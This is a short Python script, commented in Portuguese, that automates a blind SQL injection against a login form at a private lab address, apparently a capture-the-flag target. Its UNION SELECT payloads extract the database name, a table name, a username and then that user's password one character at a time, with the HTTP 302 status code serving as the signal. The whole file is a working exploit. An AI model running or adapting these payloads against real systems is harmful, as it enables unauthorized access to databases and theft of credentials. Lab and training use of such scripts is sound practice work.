#!/usr/bin/python3
# Comando para SQL Injection do tipo Blind (ou seja, não é possível obter a resposta na própria página). 
# Nesse exemplo a vericação seria no status code que muda de acordo com que o usuário de loga. 
# Autor: ooclaar
# Versão: 1.0

import requests

url = "http://10.10.98.149/index.php"

letras="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
payload="" # Inicie com o Payload em branco e vá adicionando as letras de acordo com que vai achando. 

while True:

    for letra in letras:

        data = {
            # Descomente e modifique o comando injection de acordo com sua necessidade. O primeiro exemplo enumera o banco de dados, o segundo a tabela, o terceiro o username e o ultimo a senha.
            # "username": f"' UNION SELECT 1,2,3,4 WHERE database() LIKE BINARY '{payload}{letra}%' -- -", # mywebsite
            # "username": f"' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = database() AND table_name LIKE BINARY '{payload}{letra}%' -- -", #siteusers
            "username": f"' UNION SELECT 1,2,3,4 FROM siteusers WHERE username LIKE BINARY '{payload}{letra}%';-- -", #kitty
            # "username": f"' UNION SELECT 1,2,3,4 FROM siteusers WHERE username=\"kitty\" AND password LIKE BINARY '{payload}{letra}%';-- -",
            "password": "xxx"
        }

        # Descomente caso você queira ver a consulta.
        print(data)

        headers = {
            # Pode ser que necessite fazer um ajuste aqui de acordo com o tipo de dado que é enviado para o servidor. 
            # "Content-Type": "application/json"
            "Content-Type": "application/x-www-form-urlencoded"
        }

        response = requests.post(url, data=data, headers=headers, allow_redirects=False)

        if response.status_code == 302:
            payload+=letra
            print(f"Letra encontrada: {letra}")
            break

    if response.status_code == 200 and letra=="_":
        print(f"Script finalizado, a payload encontrada foi: {payload}")
        break